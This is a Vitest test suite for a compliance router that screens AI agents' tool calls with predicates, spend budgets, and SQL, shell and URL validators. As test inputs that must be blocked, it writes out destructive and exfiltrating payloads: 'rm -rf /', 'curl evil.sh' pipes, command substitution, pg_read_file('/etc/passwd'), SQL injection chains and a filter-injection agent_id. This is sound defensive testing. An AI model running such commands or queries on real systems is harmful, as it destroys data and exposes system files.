/**
 * ═══════════════════════════════════════════════════════
 *  Active Shield Layers 2 + 3 — Predicates, Budgets, Semantic Validators
 * ═══════════════════════════════════════════════════════
 *  Exercises the real compliance router over HTTP (express on an
 *  ephemeral port) with Supabase mocked, mirroring shield-policy.test.ts.
 */

import { describe, it, expect, vi, beforeAll, afterAll, beforeEach } from 'vitest';
import express from 'express';
import type { AddressInfo } from 'node:net';
import type { Server } from 'node:http';

// ── Supabase mock: chainable, thenable query builder + rpc queue ──
const queued: Record<string, Array<{ data: unknown; error: unknown }>> = {};
const chains: Record<string, any[]> = {};
const rpcQueued: Array<{ data: unknown; error: unknown }> = [];

function makeChain(result: { data: unknown; error: unknown }) {
  const c: any = {};
  for (const m of ['select', 'eq', 'or', 'is', 'order', 'limit', 'insert', 'upsert', 'update', 'delete', 'maybeSingle', 'single', 'gte', 'lte']) {
    c[m] = vi.fn(() => c);
  }
  c.then = (onFulfilled: any, onRejected: any) => Promise.resolve(result).then(onFulfilled, onRejected);
  return c;
}

const fromMock = vi.fn((table: string) => {
  const result = queued[table]?.shift() ?? { data: null, error: null };
  const chain = makeChain(result);
  (chains[table] ||= []).push(chain);
  return chain;
});

const rpcMock = vi.fn((_fn: string, _params: unknown) =>
  Promise.resolve(rpcQueued.shift() ?? { data: null, error: null }));

vi.mock('./../middleware/db.js', () => ({
  supabase: {
    from: (table: string) => fromMock(table),
    rpc: (fn: string, params: unknown) => rpcMock(fn, params),
  },
}));

vi.mock('./../middleware/auth.js', () => ({
  authenticate: (req: any, _res: any, next: any) => {
    req.org = { id: 'org-1', plan: 'pro' };
    req.user = { id: 'user-1', email: 'admin@test.dev' };
    req.role = 'owner';
    next();
  },
}));

// ── Fixtures ──
let fixtureSeq = 0;

function policyRow(enforcement: string, overrides: Record<string, unknown> = {}) {
  fixtureSeq += 1;
  return {
    id: `pol-${fixtureSeq}`,
    org_id: 'org-1',
    tool_name: 'spend_money',
    schema: { type: 'object' },
    enforcement,
    active: true,
    predicate: null as string | null,
    created_at: '2026-07-13T00:00:00Z',
    updated_at: `2026-07-13T00:00:00Z#${fixtureSeq}`, // distinct validator cache key per fixture
    ...overrides,
  };
}

const TABLE_MISSING = { code: '42P01', message: 'relation "budgets" does not exist' };
const FN_MISSING = { code: '42883', message: 'function consume_budget(uuid, uuid, text, bigint) does not exist' };

// ── Test server ──
let server: Server;
let base: string;

async function post(path: string, body: unknown): Promise<Response> {
  return fetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
}

async function evaluate(body: Record<string, unknown>): Promise<Response> {
  return post('/api/v1/compliance/shield/evaluate', body);
}

beforeAll(async () => {
  const { default: complianceRouter } = await import('./../routes/compliance.js');
  const app = express();
  app.use(express.json());
  app.use(complianceRouter);
  server = app.listen(0);
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(() => {
  server?.close();
});

beforeEach(async () => {
  fromMock.mockClear();
  rpcMock.mockClear();
  for (const k of Object.keys(queued)) delete queued[k];
  for (const k of Object.keys(chains)) delete chains[k];
  rpcQueued.length = 0;
  const { clearValidatorCache } = await import('./../lib/shieldPolicy.js');
  clearValidatorCache();
});

// ═══════════════════════════════════════════════════════
//  Layer 2 — CEL predicates
// ═══════════════════════════════════════════════════════

describe('Layer 2: CEL predicate evaluation', () => {
  it('ALLOWs when the predicate passes (no budget reference → budgets never queried)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents < 10000' }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 500 } });
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    expect(body.reason).toBe('schema_valid');
    expect(chains.budgets).toBeUndefined();
    expect(chains.audit_log?.[0].insert.mock.calls[0][0].verdict).toBe('PROCEED');
  });

  it('BLOCKs a false predicate under enforcement=block with reason predicate_failed', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents < 10000' }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 99999 } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.reason).toBe('predicate_failed');
    expect(body.errors[0].keyword).toBe('predicate_failed');
    const audit = chains.audit_log?.[0].insert.mock.calls[0][0];
    expect(audit.verdict).toBe('BLOCK');
    expect(audit.metadata.failure_reason).toBe('predicate_failed');
  });

  it('suspends a false predicate into HITL under enforcement=require_approval', async () => {
    queued.tool_policies = [{ data: policyRow('require_approval', { predicate: 'args.env in ["dev", "staging"]' }), error: null }];
    queued.pending_approvals = [{ data: { id: 'appr-42' }, error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { env: 'prod' }, agent_id: 'agent-1' });
    const body = await res.json();
    expect(body.verdict).toBe('REQUIRE_APPROVAL');
    expect(body.reason).toBe('predicate_failed');
    expect(body.approval_id).toBe('appr-42');
    expect(chains.audit_log?.[0].insert.mock.calls[0][0].verdict).toBe('REVIEW');
  });

  it('ALLOWs (log-only) a false predicate under enforcement=monitor', async () => {
    queued.tool_policies = [{ data: policyRow('monitor', { predicate: 'args.amount_cents < 100' }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 500 } });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    expect(body.reason).toBe('monitor_only');
    expect(body.errors.length).toBeGreaterThan(0);
    expect(chains.audit_log?.[0].insert.mock.calls[0][0].verdict).toBe('PROCEED');
  });

  it('treats a predicate evaluation error as a violation (fail closed on broken rules)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.missing_key > 5' }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: {} });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors[0].keyword).toBe('predicate_error');
  });

  it('resolves budget_remaining from the budgets table and passes an under-budget call', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: [{ limit_cents: 10000, spent_cents: 4000 }], error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 5000 }, agent_id: 'agent-1' });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    // Budget lookup was org-scoped and keyed by tool_name
    const budgetChain = chains.budgets?.[0];
    expect(budgetChain.eq).toHaveBeenCalledWith('org_id', 'org-1');
    expect(budgetChain.eq).toHaveBeenCalledWith('key', 'spend_money');
  });

  it('does NOT interpolate a non-UUID agent_id into the .or() budget filter', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: [{ limit_cents: 10000, spent_cents: 0 }], error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 1 }, agent_id: 'agent-1,limit_cents.gte.0' });
    expect(res.status).toBe(200);
    const budgetChain = chains.budgets?.[0];
    expect(budgetChain.or).not.toHaveBeenCalled();
    expect(budgetChain.is).toHaveBeenCalledWith('agent_id', null);
  });

  it('interpolates a valid UUID agent_id into the .or() budget filter', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: [{ limit_cents: 10000, spent_cents: 0 }], error: null }];
    const uuid = '11111111-2222-3333-4444-555555555555';
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 1 }, agent_id: uuid });
    expect(res.status).toBe(200);
    expect(chains.budgets?.[0].or).toHaveBeenCalledWith(`agent_id.eq.${uuid},agent_id.is.null`);
  });

  it('BLOCKs an over-budget call via budget_remaining (limit - spent < amount)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: [{ limit_cents: 10000, spent_cents: 9500 }], error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 5000 } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.reason).toBe('predicate_failed');
  });

  it('treats a missing budget row as budget_remaining = 0 (fail-closed on the org own rule)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: [], error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 1 } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
  });

  it('skips the predicate (treat as pass) with a warning when the budgets table is missing (pre-031)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { predicate: 'args.amount_cents <= budget_remaining' }), error: null }];
    queued.budgets = [{ data: null, error: TABLE_MISSING }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 999999 } });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    expect(body.reason).toBe('schema_valid');
  });
});

// ═══════════════════════════════════════════════════════
//  Layer 2 — atomic budget consumption (x-budget-arg)
// ═══════════════════════════════════════════════════════

const SPEND_SCHEMA = {
  type: 'object',
  properties: { amount_cents: { type: 'number' } },
  required: ['amount_cents'],
  'x-budget-arg': 'amount_cents',
  'x-budget-key': 'ad-spend',
};

describe('Layer 2: atomic consume_budget CAS', () => {
  it('debits atomically via the consume_budget RPC and ALLOWs when the CAS succeeds', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SPEND_SCHEMA }), error: null }];
    rpcQueued.push({ data: [{ id: 'b-1', spent_cents: 700, limit_cents: 1000 }], error: null });
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 200 }, agent_id: 'agent-1' });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    expect(rpcMock).toHaveBeenCalledWith('consume_budget', {
      p_org_id: 'org-1',
      p_agent_id: 'agent-1',
      p_key: 'ad-spend',
      p_amount_cents: 200,
    });
  });

  it('BLOCKs when the CAS returns zero rows (over budget) — decision and debit are one operation', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SPEND_SCHEMA }), error: null }];
    rpcQueued.push({ data: [], error: null });
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 5000 } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.reason).toBe('budget_exceeded');
    expect(body.errors[0].keyword).toBe('budget_exceeded');
    expect(chains.audit_log?.[0].insert.mock.calls[0][0].verdict).toBe('BLOCK');
  });

  it('rejects a non-numeric budget arg before touching the budget', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: { ...SPEND_SCHEMA, required: [] } }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 'lots' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK'); // schema violation (type) fires first
    expect(rpcMock).not.toHaveBeenCalled();
  });

  it('skips the debit with a warning when the consume_budget RPC is missing (pre-031)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SPEND_SCHEMA }), error: null }];
    rpcQueued.push({ data: null, error: FN_MISSING });
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 200 } });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
  });

  it('never debits when an earlier layer already failed (blocked calls do not spend)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SPEND_SCHEMA, predicate: 'args.amount_cents < 100' }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { amount_cents: 200 } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.reason).toBe('predicate_failed');
    expect(rpcMock).not.toHaveBeenCalled();
  });
});

// ═══════════════════════════════════════════════════════
//  Layer 3 — semantic validators (parse, never regex)
// ═══════════════════════════════════════════════════════

const SQL_SCHEMA = {
  type: 'object',
  properties: {
    query: {
      type: 'string',
      'x-validator': 'sql',
      'x-allow-tables': ['observations', 'traces'],
    },
  },
  required: ['query'],
};

describe('Layer 3: SQL validator (pgsql-parser)', () => {
  it('ALLOWs a single SELECT against allowlisted tables', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA, tool_name: 'run_query' }), error: null }];
    const res = await evaluate({ tool_name: 'run_query', tool_args: { query: 'SELECT id, name FROM observations WHERE org_id = $1' } });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
    expect(body.reason).toBe('schema_valid');
  });

  it('allows CTE names without treating them as tables', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'WITH recent AS (SELECT * FROM traces) SELECT * FROM recent' } });
    const body = await res.json();
    expect(body.verdict).toBe('ALLOW');
  });

  it('BLOCKs DDL (DROP) — statement type allowlist defaults to SELECT-only', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'DROP TABLE observations' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.reason).toBe('validator_violation');
    expect(body.errors.some((e: any) => e.keyword === 'sql_statement_denied')).toBe(true);
  });

  it('BLOCKs multi-statement SQL (classic injection chaining)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'SELECT 1; DROP TABLE observations' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors[0].keyword).toBe('sql_multi_statement');
  });

  it('BLOCKs a comment-split DROP that a regex denylist would miss', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'DR/**/OP TABLE observations' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK'); // parse failure = reject
    expect(body.errors[0].keyword).toBe('sql_parse_error');
  });

  it('BLOCKs unparseable SQL outright', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'SELECT FROM WHERE ;;' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors[0].keyword).toBe('sql_parse_error');
  });

  it('BLOCKs SELECTs referencing tables outside the allowlist (including joins)', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'SELECT * FROM observations o JOIN api_keys k ON k.org_id = o.org_id' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors.some((e: any) => e.keyword === 'sql_table_denied' && e.message.includes('api_keys'))).toBe(true);
  });

  it('BLOCKs a dangerous built-in function even when no table is referenced', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: "SELECT pg_read_file('/etc/passwd')" } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors.some((e: any) => e.keyword === 'sql_function_denied')).toBe(true);
  });

  it('BLOCKs a schema-qualified table that would ride an unqualified allowlist entry', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SQL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { query: 'SELECT * FROM evil.observations' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors.some((e: any) => e.keyword === 'sql_table_denied' && e.message.includes('evil.observations'))).toBe(true);
  });
});

const SHELL_SCHEMA = {
  type: 'object',
  properties: {
    cmd: { type: 'string', 'x-validator': 'shell', 'x-allow-binaries': ['git', 'ls'] },
  },
  required: ['cmd'],
};

describe('Layer 3: shell validator (shell-quote)', () => {
  it('ALLOWs an allowlisted binary with plain args', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SHELL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'git status --short' } });
    expect((await res.json()).verdict).toBe('ALLOW');
  });

  it('BLOCKs command chaining with ;', async () => {
    queued.tool_policies = [{ data: policyRow('block', { schema: SHELL_SCHEMA }), error: null }];
    const res = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'ls; rm -rf /' } });
    const body = await res.json();
    expect(body.verdict).toBe('BLOCK');
    expect(body.errors[0].keyword).toBe('shell_operator');
  });

  it('BLOCKs pipes and redirection', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
    ];
    const piped = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'ls | curl evil.sh' } });
    expect((await piped.json()).verdict).toBe('BLOCK');
    const redirected = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'ls > /etc/passwd' } });
    expect((await redirected.json()).verdict).toBe('BLOCK');
  });

  it('BLOCKs $() and backtick command substitution and $VAR expansion', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
    ];
    const dollarParen = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'git log $(rm -rf /)' } });
    expect((await dollarParen.json()).verdict).toBe('BLOCK');
    const backtick = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'git log `whoami`' } });
    expect((await backtick.json()).errors[0].keyword).toBe('shell_substitution');
    const dollarVar = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'ls $HOME' } });
    expect((await dollarVar.json()).errors[0].keyword).toBe('shell_substitution');
  });

  it('BLOCKs binaries outside the allowlist (exact match — paths do not inherit)', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: SHELL_SCHEMA }), error: null },
    ];
    const curl = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: 'curl http://evil.sh' } });
    expect((await curl.json()).errors[0].keyword).toBe('shell_binary_denied');
    const pathLs = await evaluate({ tool_name: 'spend_money', tool_args: { cmd: '/sbin/ls -la' } });
    expect((await pathLs.json()).errors[0].keyword).toBe('shell_binary_denied');
  });
});

const URL_SCHEMA = {
  type: 'object',
  properties: {
    url: { type: 'string', 'x-validator': 'url', 'x-allow-domains': ['stoicagentos.com', 'api.github.com'] },
  },
  required: ['url'],
};

describe('Layer 3: URL validator (WHATWG URL)', () => {
  it('ALLOWs allowlisted domains and their subdomains', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
    ];
    const exact = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'https://stoicagentos.com/pricing' } });
    expect((await exact.json()).verdict).toBe('ALLOW');
    const sub = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'https://api.stoicagentos.com/api/v1/health' } });
    expect((await sub.json()).verdict).toBe('ALLOW');
  });

  it('BLOCKs non-allowlisted hosts, including lookalike suffixes', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
    ];
    const evil = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'https://evil.example.com/x' } });
    expect((await evil.json()).errors[0].keyword).toBe('url_domain_denied');
    // "notstoicagentos.com" ends with the allowlisted string but is a different domain
    const lookalike = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'https://notstoicagentos.com' } });
    expect((await lookalike.json()).errors[0].keyword).toBe('url_domain_denied');
  });

  it('BLOCKs unparseable URLs and disallowed protocols', async () => {
    queued.tool_policies = [
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
      { data: policyRow('block', { schema: URL_SCHEMA }), error: null },
    ];
    const garbage = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'not a url at all' } });
    expect((await garbage.json()).errors[0].keyword).toBe('url_parse_error');
    const fileUrl = await evaluate({ tool_name: 'spend_money', tool_args: { url: 'file:///etc/passwd' } });
    expect((await fileUrl.json()).errors[0].keyword).toBe('url_protocol_denied');
  });
});

// ═══════════════════════════════════════════════════════
//  Policy CRUD — predicate handling
// ═══════════════════════════════════════════════════════

describe('POST /api/v1/compliance/shield/policies with predicate', () => {
  it('stores a policy with a valid CEL predicate', async () => {
    queued.tool_policies = [{ data: policyRow('block'), error: null }];
    const res = await post('/api/v1/compliance/shield/policies', {
      tool_name: 'spend_money', schema: {}, enforcement: 'block', predicate: 'args.amount_cents <= budget_remaining',
    });
    expect(res.status).toBe(201);
    const upsert = chains.tool_policies?.[0].upsert.mock.calls[0][0];
    expect(upsert.predicate).toBe('args.amount_cents <= budget_remaining');
  });

  it('rejects an unparseable CEL predicate with 400 before storing', async () => {
    const res = await post('/api/v1/compliance/shield/policies', {
      tool_name: 'spend_money', schema: {}, predicate: 'args.amount <=',
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain('CEL');
    expect(fromMock).not.toHaveBeenCalled();
  });

  it('rejects a non-string predicate with 400 (null is allowed to clear)', async () => {
    const res = await post('/api/v1/compliance/shield/policies', {
      tool_name: 'spend_money', schema: {}, predicate: 42,
    });
    expect(res.status).toBe(400);
  });

  it('returns 503 pointing at migration 031 when the predicate column is missing', async () => {
    queued.tool_policies = [{ data: null, error: { code: '42703', message: 'column "predicate" of relation "tool_policies" does not exist' } }];
    const res = await post('/api/v1/compliance/shield/policies', {
      tool_name: 'spend_money', schema: {}, predicate: 'true == true',
    });
    expect(res.status).toBe(503);
    expect((await res.json()).error).toContain('031');
  });

  it('omits the predicate column entirely when the caller does not send one (pre-031 compatible)', async () => {
    queued.tool_policies = [{ data: policyRow('monitor'), error: null }];
    const res = await post('/api/v1/compliance/shield/policies', { tool_name: 'spend_money', schema: {} });
    expect(res.status).toBe(201);
    const upsert = chains.tool_policies?.[0].upsert.mock.calls[0][0];
    expect('predicate' in upsert).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════
//  Budgets CRUD
// ═══════════════════════════════════════════════════════

describe('shield/budgets CRUD', () => {
  it('upserts a budget scoped to the org', async () => {
    queued.budgets = [{ data: { id: 'b-1', key: 'ad-spend', limit_cents: 10000 }, error: null }];
    const res = await post('/api/v1/compliance/shield/budgets', { key: 'ad-spend', limit_cents: 10000 });
    expect(res.status).toBe(201);
    const upsert = chains.budgets?.[0].upsert.mock.calls[0];
    expect(upsert[0]).toMatchObject({ org_id: 'org-1', key: 'ad-spend', limit_cents: 10000, agent_id: null, period: 'monthly' });
    expect(upsert[1]).toEqual({ onConflict: 'org_id,agent_id,key' });
  });

  it('rejects a negative limit with 400', async () => {
    const res = await post('/api/v1/compliance/shield/budgets', { key: 'ad-spend', limit_cents: -5 });
    expect(res.status).toBe(400);
  });

  it('returns [] when the budgets table is missing (graceful degradation)', async () => {
    queued.budgets = [{ data: null, error: TABLE_MISSING }];
    const res = await fetch(`${base}/api/v1/compliance/shield/budgets`);
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual([]);
  });

  it('returns 503 pointing at migration 031 when upserting into a missing table', async () => {
    queued.budgets = [{ data: null, error: TABLE_MISSING }];
    const res = await post('/api/v1/compliance/shield/budgets', { key: 'ad-spend', limit_cents: 100 });
    expect(res.status).toBe(503);
    expect((await res.json()).error).toContain('031');
  });
});
